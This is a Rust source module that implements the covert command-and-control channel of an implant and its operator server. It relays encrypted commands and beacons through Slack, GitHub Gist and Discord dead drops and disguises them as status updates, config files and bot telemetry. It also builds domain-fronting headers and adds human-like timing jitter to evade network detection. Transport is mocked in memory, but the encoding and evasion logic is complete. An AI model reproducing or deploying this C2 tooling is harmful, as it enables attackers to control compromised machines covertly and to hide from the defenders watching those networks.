use std::collections::VecDeque;
use std::fmt;
use std::sync::{Arc, Mutex};

use base64::{engine::general_purpose::STANDARD as B64, Engine};
use serde::{Deserialize, Serialize};

use crate::c2_protocol::{
    C2Message, C2ProtocolError, CommandMessage, SessionCipher,
};
use crate::covert_channel::base32_encode;

/// SaaS platform used as a dead-drop relay for C2 traffic.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub enum SaasProvider {
    Slack,
    GithubGist,
    Discord,
}

impl fmt::Display for SaasProvider {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        let label = match self {
            Self::Slack => "Slack",
            Self::GithubGist => "GitHub Gist",
            Self::Discord => "Discord",
        };
        write!(f, "{label}")
    }
}

/// Errors specific to the HTTPS C2 channel.
#[derive(Debug)]
pub enum HttpsC2Error {
    Protocol(C2ProtocolError),
    EncodingFailed(String),
    DecodingFailed(String),
    ProviderUnavailable(SaasProvider),
    RequestFailed(String),
    NoMessages,
}

impl fmt::Display for HttpsC2Error {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::Protocol(e) => write!(f, "protocol error: {e}"),
            Self::EncodingFailed(msg) => write!(f, "encoding failed: {msg}"),
            Self::DecodingFailed(msg) => write!(f, "decoding failed: {msg}"),
            Self::ProviderUnavailable(p) => write!(f, "provider unavailable: {p}"),
            Self::RequestFailed(msg) => write!(f, "request failed: {msg}"),
            Self::NoMessages => write!(f, "no messages available"),
        }
    }
}

impl std::error::Error for HttpsC2Error {}

impl From<C2ProtocolError> for HttpsC2Error {
    fn from(e: C2ProtocolError) -> Self {
        Self::Protocol(e)
    }
}

/// Configuration for HTTPS C2 channel.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct HttpsC2Config {
    pub provider: SaasProvider,
    pub webhook_url: String,
    pub poll_url: String,
    pub polling_interval_ms: u64,
    pub domain_fronting: Option<DomainFrontConfig>,
    pub jitter_pct: f64,
}

/// Domain fronting configuration for HTTPS C2.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DomainFrontConfig {
    pub front_domain: String,
    pub actual_host: String,
    pub path_prefix: String,
}

impl Default for HttpsC2Config {
    fn default() -> Self {
        Self {
            provider: SaasProvider::Slack,
            webhook_url: String::new(),
            poll_url: String::new(),
            polling_interval_ms: 30_000,
            domain_fronting: None,
            jitter_pct: 0.2,
        }
    }
}

/// Encode a C2 message for Slack webhook delivery.
///
/// CBOR-serialized encrypted payload is base64-encoded and wrapped in a
/// Slack message JSON payload as innocuous-looking text.
pub fn encode_slack_message(
    msg: &C2Message,
    cipher: &SessionCipher,
) -> Result<String, HttpsC2Error> {
    let cbor = crate::c2_protocol::serialize_message(msg)?;
    let encrypted = cipher.encrypt(&cbor)?;
    let encoded = B64.encode(&encrypted);
    let payload = serde_json::json!({
        "text": format!("status update: {encoded}")
    });
    serde_json::to_string(&payload)
        .map_err(|e| HttpsC2Error::EncodingFailed(e.to_string()))
}

/// Decode a Slack message back to a C2 message.
pub fn decode_slack_message(
    json_body: &str,
    cipher: &SessionCipher,
) -> Result<C2Message, HttpsC2Error> {
    let parsed: serde_json::Value = serde_json::from_str(json_body)
        .map_err(|e| HttpsC2Error::DecodingFailed(format!("json parse: {e}")))?;
    let text = parsed["text"]
        .as_str()
        .ok_or_else(|| HttpsC2Error::DecodingFailed("missing text field".to_string()))?;
    let encoded = text
        .strip_prefix("status update: ")
        .ok_or_else(|| HttpsC2Error::DecodingFailed("bad message prefix".to_string()))?;
    let encrypted = B64
        .decode(encoded)
        .map_err(|e| HttpsC2Error::DecodingFailed(format!("base64: {e}")))?;
    let cbor = cipher.decrypt(&encrypted)?;
    let msg = crate::c2_protocol::deserialize_message(&cbor)?;
    Ok(msg)
}

/// Encode a C2 message for GitHub Gist delivery.
///
/// Encrypted payload stored as base32 in a gist file content, looking like
/// a legitimate configuration or log file.
pub fn encode_gist_content(
    msg: &C2Message,
    cipher: &SessionCipher,
) -> Result<String, HttpsC2Error> {
    let cbor = crate::c2_protocol::serialize_message(msg)?;
    let encrypted = cipher.encrypt(&cbor)?;
    let encoded = base32_encode(&encrypted);
    Ok(format!("# config v2.1\n# generated: auto\ndata={encoded}\n"))
}

/// Decode a GitHub Gist content back to a C2 message.
pub fn decode_gist_content(
    content: &str,
    cipher: &SessionCipher,
) -> Result<C2Message, HttpsC2Error> {
    let data_line = content
        .lines()
        .find(|line| line.starts_with("data="))
        .ok_or_else(|| HttpsC2Error::DecodingFailed("no data= line".to_string()))?;
    let encoded = data_line
        .strip_prefix("data=")
        .ok_or_else(|| HttpsC2Error::DecodingFailed("bad data prefix".to_string()))?;
    let encrypted = crate::covert_channel::base32_decode(encoded)
        .ok_or_else(|| HttpsC2Error::DecodingFailed("base32 decode failed".to_string()))?;
    let cbor = cipher.decrypt(&encrypted)?;
    let msg = crate::c2_protocol::deserialize_message(&cbor)?;
    Ok(msg)
}

/// Encode a C2 message for Discord webhook delivery.
///
/// Encrypted payload embedded in a Discord embed field, appearing as a
/// normal bot status update.
pub fn encode_discord_message(
    msg: &C2Message,
    cipher: &SessionCipher,
) -> Result<String, HttpsC2Error> {
    let cbor = crate::c2_protocol::serialize_message(msg)?;
    let encrypted = cipher.encrypt(&cbor)?;
    let encoded = B64.encode(&encrypted);
    let payload = serde_json::json!({
        "embeds": [{
            "title": "System Monitor",
            "fields": [{
                "name": "telemetry",
                "value": encoded,
                "inline": false
            }],
            "color": 3447003
        }]
    });
    serde_json::to_string(&payload)
        .map_err(|e| HttpsC2Error::EncodingFailed(e.to_string()))
}

/// Decode a Discord message back to a C2 message.
pub fn decode_discord_message(
    json_body: &str,
    cipher: &SessionCipher,
) -> Result<C2Message, HttpsC2Error> {
    let parsed: serde_json::Value = serde_json::from_str(json_body)
        .map_err(|e| HttpsC2Error::DecodingFailed(format!("json parse: {e}")))?;
    let encoded = parsed["embeds"][0]["fields"][0]["value"]
        .as_str()
        .ok_or_else(|| HttpsC2Error::DecodingFailed("missing embed field value".to_string()))?;
    let encrypted = B64
        .decode(encoded)
        .map_err(|e| HttpsC2Error::DecodingFailed(format!("base64: {e}")))?;
    let cbor = cipher.decrypt(&encrypted)?;
    let msg = crate::c2_protocol::deserialize_message(&cbor)?;
    Ok(msg)
}

/// Build domain-fronted HTTP headers.
///
/// The TLS connection (SNI) goes to `front_domain` but the HTTP Host header
/// specifies `actual_host`, routing traffic to the real C2 server behind the CDN.
pub fn build_domain_front_headers(config: &DomainFrontConfig) -> Vec<(String, String)> {
    vec![
        ("Host".to_string(), config.actual_host.clone()),
        (
            "User-Agent".to_string(),
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36".to_string(),
        ),
        ("Accept".to_string(), "text/html,application/json".to_string()),
        ("Accept-Language".to_string(), "en-US,en;q=0.9".to_string()),
        ("Connection".to_string(), "keep-alive".to_string()),
    ]
}

/// Generate a realistic browsing delay with jitter to mimic human traffic.
pub fn browsing_delay_ms(base_ms: u64, jitter_pct: f64) -> u64 {
    let jitter_range = (base_ms as f64 * jitter_pct) as u64;
    if jitter_range == 0 {
        return base_ms;
    }
    let offset = base_ms % (jitter_range * 2 + 1);
    base_ms.saturating_sub(jitter_range) + offset
}

/// Mock HTTP server for testing the HTTPS C2 channel.
///
/// Simulates Slack/GitHub/Discord endpoints by storing messages in memory.
#[derive(Debug, Clone)]
pub struct MockHttpServer {
    messages: Arc<Mutex<VecDeque<String>>>,
    gist_content: Arc<Mutex<Option<String>>>,
}

impl MockHttpServer {
    pub fn new() -> Self {
        Self {
            messages: Arc::new(Mutex::new(VecDeque::new())),
            gist_content: Arc::new(Mutex::new(None)),
        }
    }

    /// Simulate posting a webhook message (Slack or Discord).
    pub fn post_webhook(&self, body: &str) {
        let mut msgs = self.messages.lock().expect("lock");
        msgs.push_back(body.to_string());
    }

    /// Simulate polling for the next message.
    pub fn poll_message(&self) -> Option<String> {
        let mut msgs = self.messages.lock().expect("lock");
        msgs.pop_front()
    }

    /// Simulate creating/updating a GitHub Gist.
    pub fn update_gist(&self, content: &str) {
        let mut gist = self.gist_content.lock().expect("lock");
        *gist = Some(content.to_string());
    }

    /// Simulate reading a GitHub Gist.
    pub fn read_gist(&self) -> Option<String> {
        let gist = self.gist_content.lock().expect("lock");
        gist.clone()
    }

    /// Count pending messages.
    pub fn pending_count(&self) -> usize {
        let msgs = self.messages.lock().expect("lock");
        msgs.len()
    }
}

impl Default for MockHttpServer {
    fn default() -> Self {
        Self::new()
    }
}

/// HTTPS C2 client (implant side).
///
/// Sends beacons and receives commands via SaaS dead drops.
pub struct HttpsC2Client {
    config: HttpsC2Config,
    cipher: SessionCipher,
    server: MockHttpServer,
}

impl HttpsC2Client {
    pub fn new(config: HttpsC2Config, key: &[u8; 32], server: MockHttpServer) -> Self {
        Self {
            config,
            cipher: SessionCipher::new(key),
            server,
        }
    }

    /// Send a beacon via the configured SaaS provider.
    pub fn send_beacon(&self, msg: &C2Message) -> Result<(), HttpsC2Error> {
        let body = match self.config.provider {
            SaasProvider::Slack => encode_slack_message(msg, &self.cipher)?,
            SaasProvider::GithubGist => {
                let content = encode_gist_content(msg, &self.cipher)?;
                self.server.update_gist(&content);
                return Ok(());
            }
            SaasProvider::Discord => encode_discord_message(msg, &self.cipher)?,
        };
        self.server.post_webhook(&body);
        Ok(())
    }

    /// Poll for a pending command from the operator.
    pub fn poll_command(&self) -> Result<Option<CommandMessage>, HttpsC2Error> {
        let body = match self.config.provider {
            SaasProvider::GithubGist => self.server.read_gist(),
            _ => self.server.poll_message(),
        };
        match body {
            Some(data) => {
                let msg = match self.config.provider {
                    SaasProvider::Slack => decode_slack_message(&data, &self.cipher)?,
                    SaasProvider::GithubGist => decode_gist_content(&data, &self.cipher)?,
                    SaasProvider::Discord => decode_discord_message(&data, &self.cipher)?,
                };
                match msg {
                    C2Message::Command(cmd) => Ok(Some(cmd)),
                    _ => Ok(None),
                }
            }
            None => Ok(None),
        }
    }
}

/// HTTPS C2 server (operator side).
///
/// Receives beacons and sends commands via SaaS dead drops.
pub struct HttpsC2Server {
    config: HttpsC2Config,
    cipher: SessionCipher,
    server: MockHttpServer,
    received: Vec<C2Message>,
}

impl HttpsC2Server {
    pub fn new(config: HttpsC2Config, key: &[u8; 32], server: MockHttpServer) -> Self {
        Self {
            config,
            cipher: SessionCipher::new(key),
            server,
            received: Vec::new(),
        }
    }

    /// Poll for incoming beacon messages.
    pub fn poll_beacon(&mut self) -> Result<Option<C2Message>, HttpsC2Error> {
        let body = match self.config.provider {
            SaasProvider::GithubGist => self.server.read_gist(),
            _ => self.server.poll_message(),
        };
        match body {
            Some(data) => {
                let msg = match self.config.provider {
                    SaasProvider::Slack => decode_slack_message(&data, &self.cipher)?,
                    SaasProvider::GithubGist => decode_gist_content(&data, &self.cipher)?,
                    SaasProvider::Discord => decode_discord_message(&data, &self.cipher)?,
                };
                self.received.push(msg.clone());
                Ok(Some(msg))
            }
            None => Ok(None),
        }
    }

    /// Send a command to an implant via the configured provider.
    pub fn send_command(&self, cmd: &CommandMessage) -> Result<(), HttpsC2Error> {
        let msg = C2Message::Command(cmd.clone());
        let body = match self.config.provider {
            SaasProvider::Slack => encode_slack_message(&msg, &self.cipher)?,
            SaasProvider::GithubGist => {
                let content = encode_gist_content(&msg, &self.cipher)?;
                self.server.update_gist(&content);
                return Ok(());
            }
            SaasProvider::Discord => encode_discord_message(&msg, &self.cipher)?,
        };
        self.server.post_webhook(&body);
        Ok(())
    }

    /// All received messages.
    pub fn received_messages(&self) -> &[C2Message] {
        &self.received
    }
}

#[cfg(test)]
#[path = "c2_https_test.rs"]
mod tests;
